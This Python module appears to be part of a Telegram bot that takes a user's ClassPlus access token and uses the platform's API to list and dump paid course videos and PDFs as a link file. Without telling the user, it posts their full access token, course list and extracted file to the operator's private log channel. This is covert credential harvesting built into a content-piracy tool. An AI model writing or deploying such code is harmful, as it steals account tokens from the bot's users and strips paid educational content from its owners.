import asyncio
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import cloudscraper
from config import PREMIUM_LOGS, BOT_TEXT
from datetime import datetime
import pytz
import base64
from urllib.parse import urlparse

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper()

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    """ClassPlus extractor - Direct token mode only"""
    details = await app.ask(message.chat.id,
        "🔹 <b>CLASSPLUS EXTRACTOR</b> 🔹\n\n"
        "Send your ClassPlus access token:\n\n"
        "Example:\n"
        "<code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )
    
    user_input = details.text.strip()

    if len(user_input) < 20:
        await message.reply("❌ Invalid token. Please send a valid ClassPlus access token.")
        return

    try:
        a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{user_input}`</blockquote>"
        await app.send_message(PREMIUM_LOGS, a)
        
        headers = {
            'x-access-token': user_input,
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }
        
        response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)
        
        if response.status_code == 200:
            courses = response.json()["data"]["courses"]
            
            s.session_data = {
                "token": user_input,
                "courses": {course["id"]: course["name"] for course in courses}
            }

            org_name = None

            for course in courses:
                shareable_link = course["shareableLink"]
                
                if "courses.store" in shareable_link:
                    new_data = shareable_link.split('.')[0].split('//')[-1]
                    org_response = s.get(f"{apiurl}/v2/orgs/{new_data}", headers=headers)
                    
                    if org_response.status_code == 200:
                        org_data = org_response.json().get("data", {})
                        org_name = org_data.get("orgName")
                        break
                else:
                    org_name = shareable_link.split('//')[1].split('.')[1]
                    break

            await fetch_batches(app, message, org_name)
        else:
            await message.reply("❌ Invalid token or no courses found. Please check your token and try again.")
    
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")
        await app.send_message(PREMIUM_LOGS, f"Error in ClassPlus extractor: {str(e)}")



async def fetch_batches(app, message, org_name):
    session_data = s.session_data
    
    if "courses" in session_data:
        courses = session_data["courses"]
        
        
      
        text = "📚 <b>Available Batches</b>\n\n"
        course_list = []
        for idx, (course_id, course_name) in enumerate(courses.items(), start=1):
            text += f"{idx}. <code>{course_name}</code>\n"
            course_list.append((idx, course_id, course_name))
        
        await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")
        selected_index = await app.ask(
            message.chat.id, 
            f"{text}\n"
            "Send the index number of the batch to download.", 
            timeout=180
        )
        
        if selected_index.text.isdigit():
            selected_idx = int(selected_index.text.strip())
            
            if 1 <= selected_idx <= len(course_list):
                selected_course_id = course_list[selected_idx - 1][1]
                selected_course_name = course_list[selected_idx - 1][2]
                
                await app.send_message(
                    message.chat.id,
                    "🔄 <b>Processing Course</b>\n"
                    f"└─ Current: <code>{selected_course_name}</code>"
                )
                await extract_batch(app, message, org_name, selected_course_id)
            else:
                await app.send_message(
                    message.chat.id,
                    "❌ <b>Invalid Input!</b>\n\n"
                    "Please send a valid index number from the list."
                )
        else:
            await app.send_message(
                message.chat.id,
                "❌ <b>Invalid Input!</b>\n\n"
                "Please send a valid index number."
            )
              
    else:
        await app.send_message(
            message.chat.id,
            "❌ <b>No Batches Found</b>\n\n"
            "Please check your credentials and try again."
        )


async def extract_batch(app, message, org_name, batch_id):
    session_data = s.session_data
    
    if "token" in session_data:
        batch_name = session_data["courses"][batch_id]
        headers = {
            'x-access-token': session_data["token"],
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }

        def encode_partial_url(url):
            """Encode the latter half of the URL while keeping the first half readable."""
            if not url:
                return ""
            
            # Parse the URL
            parsed = urlparse(url)
            
            # Get the base part (scheme + netloc)
            base_part = f"{parsed.scheme}://{parsed.netloc}"
            
            # Get everything after the domain
            path_part = url[len(base_part):]
            
            # Encode the path part
            encoded_path = base64.b64encode(path_part.encode()).decode()
            
            # Return combined URL
            return f"{base_part}{encoded_path}"

        async def fetch_live_videos(course_id):
            """Fetch live videos from the API with contentHashId."""
            outputs = []
            async with aiohttp.ClientSession() as session:
                try:
                    url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                    async with session.get(url, headers=headers) as response:
                        j = await response.json()
                        if "data" in j and "list" in j["data"]:
                            for video in j["data"]["list"]:
                                name = video.get("name", "Unknown Video")
                                video_url = video.get("url", "")
                                content_hash = video.get("contentHashId", "")
                        
                                if video_url:
                                    # Encode the latter part of the URL
                                    encoded_url = encode_partial_url(video_url)
                                    # Include contentHashId as part of the output
                                    outputs.append(f"{name}:\n{encoded_url}\ncontentHashId: {content_hash}\n")
                except Exception as e:
                    print(f"Error fetching live videos: {e}")

            return outputs


        async def process_course_contents(course_id, folder_id=0, folder_path=""):
            """Recursively fetch and process course content, with partially encoded URLs."""
            result = []
            url = f'{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}'

            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers) as resp:
                    course_data = await resp.json()
                    course_data = course_data["data"]["courseContent"]

            tasks = []
            for item in course_data:
                content_type = str(item.get("contentType"))
                sub_id = item.get("id")
                sub_name = item.get("name", "Untitled")
                video_url = item.get("url", "")
                content_hash = item.get("contentHashId", "")

                if content_type in ("2", "3"):  # Video or PDF
                    if video_url:
                        # Encode the latter part of the URL
                        encoded_url = encode_partial_url(video_url)
                        if content_hash:
                            encoded_url += f"*UGxCP_hash={content_hash}\n"
                        full_info = f"{folder_path}{sub_name}: {encoded_url}"
                        result.append(full_info)

                elif content_type == "1":  # Folder
                    new_folder_path = f"{folder_path}{sub_name} - "
                    tasks.append(process_course_contents(course_id, sub_id, new_folder_path))

            sub_contents = await asyncio.gather(*tasks)
            for sub_content in sub_contents:
                result.extend(sub_content)

            return result

        
        async def write_to_file(extracted_data):
            """Write data to a text file asynchronously."""
            invalid_chars = '\t:/+#|@*.'
            clean_name = ''.join(char for char in batch_name if char not in invalid_chars)
            clean_name = clean_name.replace('_', ' ')
            file_path = f"{clean_name}.txt"
            
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(''.join(extracted_data))  
            return file_path

        extracted_data, live_videos = await asyncio.gather(
            process_course_contents(batch_id),
            fetch_live_videos(batch_id)
        )

        extracted_data.extend(live_videos)
        file_path = await write_to_file(extracted_data)

        # Count different types of content
        video_count = sum(1 for line in extracted_data if "Video" in line or ".mp4" in line)
        pdf_count = sum(1 for line in extracted_data if ".pdf" in line)
        total_links = len(extracted_data)
        other_count = total_links - (video_count + pdf_count)
        
        caption = (
            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
            f"📱 <b>APP:</b> {org_name}\n"
            f"📚 <b>BATCH:</b> {batch_name}\n"
            f"📅 <b>DATE:</b> {time_new} IST\n\n"
            f"📊 <b>CONTENT STATS</b>\n"
            f"├─ 📁 Total Links: {total_links}\n"
            f"├─ 🎬 Videos: {video_count}\n"
            f"├─ 📄 PDFs: {pdf_count}\n"
            f"└─ 📦 Others: {other_count}\n\n"
            f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
            f"<code>╾───• {BOT_TEXT} •───╼</code>"
        )

        await app.send_document(message.chat.id, file_path, caption=caption)
        await app.send_document(PREMIUM_LOGS, file_path, caption=caption)

        os.remove(file_path)
            

    
